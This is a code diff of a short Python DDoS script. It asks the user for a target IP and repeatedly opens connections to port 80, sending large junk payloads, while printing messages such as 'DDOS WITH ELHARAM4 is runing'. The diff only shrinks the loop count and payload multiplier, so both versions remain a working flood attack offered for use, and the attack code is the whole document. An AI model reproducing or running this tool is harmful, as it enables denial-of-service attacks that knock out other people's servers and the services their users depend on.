@@ -15,12 +15,12 @@ R = "\033[31m"    # Red
 import socket
 print("")
 ip=input("ENTER YOUR TARGET or YOUR IP : ");print ("DDos in your target is raning",ip)
-for h in range(50000):
+for h in range(5000):
   try:
       knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
       socket.setdefaulttimeout(1)
       Jmeel=knig.connect((ip,80))
-      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿eljdbcjdjsbsjsbdjdbhdbdhdelarsolallah"*10000000
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿eljdbcjdjsbsjsbdjdbhdbdhdelarsolallah"*10000
       data=data.encode("utf-8")
       knig.send(data)
       print('[√√√] DDos in (ip)',YY,ip,'DDOS WITH ELHARAM4 is runing ',CC,'port [80]')
